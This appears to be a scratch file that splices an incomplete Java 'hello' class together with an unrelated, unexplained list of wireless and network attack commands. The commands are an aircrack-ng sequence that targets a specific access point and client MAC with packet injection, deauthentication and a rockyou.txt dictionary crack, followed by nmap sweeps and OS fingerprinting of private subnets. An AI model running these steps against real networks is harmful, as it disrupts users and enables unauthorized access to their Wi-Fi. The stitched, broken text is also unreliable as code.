public class Diyici{
public static void main(String[] args){
System.out.println("hello");
}
airmon-ng check kill

airmon-ng start wlan0

airodump-ng wlan0mon

airodump-ng --ivs -w longas -c 3 wlan0mon

aireplay-ng -3 -b D4:EE:07:3D:9C:94 -h 6C:5C:14:17:33:58 wlan0mon



aireplay-ng -0 100 -a D4:EE:07:3D:9C:94 -c 6C:5C:14:17:33:58 wlan0mon

airodump-ng -c 3 -w longas wlan0mon

aircrack-ng -w rockyou.txt chen-02.cap





nmap -PE 192.168.1.1-255

nmap -sL 192.168.1.1-255

nmap -PR 192.168.1.1-255

nmap -A 192.168.2.125

nmap -sT -O 192.168.2.125
